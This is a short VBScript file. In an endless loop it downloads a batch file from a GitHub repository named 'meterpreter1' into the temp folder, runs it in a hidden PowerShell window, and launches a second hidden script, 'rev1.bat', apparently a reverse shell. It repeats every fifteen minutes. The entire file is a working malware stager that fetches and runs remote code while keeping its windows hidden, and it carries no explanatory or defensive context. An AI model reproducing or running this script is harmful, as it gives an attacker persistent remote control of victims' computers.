Do
     Set objShell = CreateObject("WScript.Shell")
     objShell.Run "cmd /c curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/nihbtdtdow1.bat -o %temp%\nihbtdtdow1.bat", 0, True
     objShell.Run "powershell -WindowStyle Hidden -Command Start-Process -FilePath '%temp%\nihbtdtdow1.bat' -WindowStyle Hidden", 0, True
     objShell.Run "powershell -c Start-Process -FilePath '%temp%\rev1.bat' -WindowStyle Hidden", 0, True
     WScript.Sleep 900000
Loop
